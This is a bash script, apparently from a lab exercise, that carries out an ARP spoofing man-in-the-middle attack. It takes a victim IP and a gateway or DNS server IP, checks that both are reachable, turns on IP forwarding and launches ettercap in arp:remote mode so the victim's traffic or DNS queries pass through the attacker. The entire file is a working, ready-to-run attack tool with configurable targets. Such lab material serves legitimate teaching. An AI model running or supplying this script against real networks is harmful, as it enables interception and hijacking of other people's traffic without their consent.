#!/bin/bash

# ARP Spoofing Script for Laboratory 1
# This script performs ARP spoofing between a victim and the gateway

# Cleanup function
cleanup() {
    echo ""
    echo "Stopping ARP Spoofing..."
    echo "ARP table after attack:"
    arp -a
    echo ""
    echo "Attack terminated."
    exit 0
}

# Configure trap to clean up on SIGINT (Ctrl+C)
trap cleanup SIGINT

echo "=== ARP Spoofing Attack Script ==="
echo "Current network configuration:"
ip route show
echo ""

# Configuration variables
VICTIM_IP="${1:-192.168.1.30}"    # Victim IP (requester)
TARGET_IP="${2:-192.168.1.1}"     # Target IP (can be gateway or DNS server)
INTERFACE="${3:-eth0}"            # Network interface

echo "Target: $VICTIM_IP"
echo "Target to impersonate: $TARGET_IP" 
echo "Interface: $INTERFACE"
echo ""

# Detect if target is DNS server or gateway
if [ "$TARGET_IP" = "192.168.1.4" ]; then
    echo "🎯 Mode: ARP spoofing against DNS server"
    echo "   Victim will send DNS queries to attacker"
elif [ "$TARGET_IP" = "192.168.1.1" ]; then
    echo "🎯 Mode: ARP spoofing against gateway"
    echo "   All victim traffic will pass through attacker"
else
    echo "🎯 Mode: ARP spoofing against $TARGET_IP"
fi
echo ""

# Verify connectivity
echo "Verifying connectivity..."
if ping -c 1 $VICTIM_IP > /dev/null 2>&1; then
    echo "✓ Victim $VICTIM_IP is reachable"
else
    echo "✗ Cannot reach victim $VICTIM_IP"
    exit 1
fi

if ping -c 1 $TARGET_IP > /dev/null 2>&1; then
    echo "✓ Target $TARGET_IP is reachable"
else
    echo "✗ Cannot reach target $TARGET_IP"
    exit 1
fi

echo ""
echo "ARP table before attack:"
arp -a
echo ""

# Enable IP forwarding to forward traffic
echo "Enabling IP forwarding..."

# Try with sysctl first (more robust method)
if sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1; then
    echo "✓ IP forwarding enabled via sysctl"
elif [ -w /proc/sys/net/ipv4/ip_forward ]; then
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo "✓ IP forwarding enabled via /proc"
else
    echo "⚠ Cannot write to /proc/sys/net/ipv4/ip_forward (read-only)"
    echo "  Container needs to run with --privileged"
    echo "  Continuing with attack..."
fi

# Check current IP forwarding status
current_forward=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo "0")
echo "Current IP forwarding status: $current_forward"

# Disable IPv6 forwarding to avoid ettercap errors
echo "Disabling IPv6 forwarding to avoid errors..."
sysctl -w net.ipv6.conf.all.forwarding=0 > /dev/null 2>&1 || echo "⚠ Could not disable IPv6 forwarding"

echo "Starting ARP Spoofing..."
echo "Press Ctrl+C to stop the attack"
echo ""

# Execute ARP spoofing with ettercap
# -T: text mode
# -M arp:remote: ARP spoofing with forwarding
# -i: specify interface
echo "Executing: ettercap -T -i $INTERFACE -M arp:remote /$VICTIM_IP// /$TARGET_IP//"
ettercap -T -i $INTERFACE -M arp:remote /$VICTIM_IP// /$TARGET_IP//
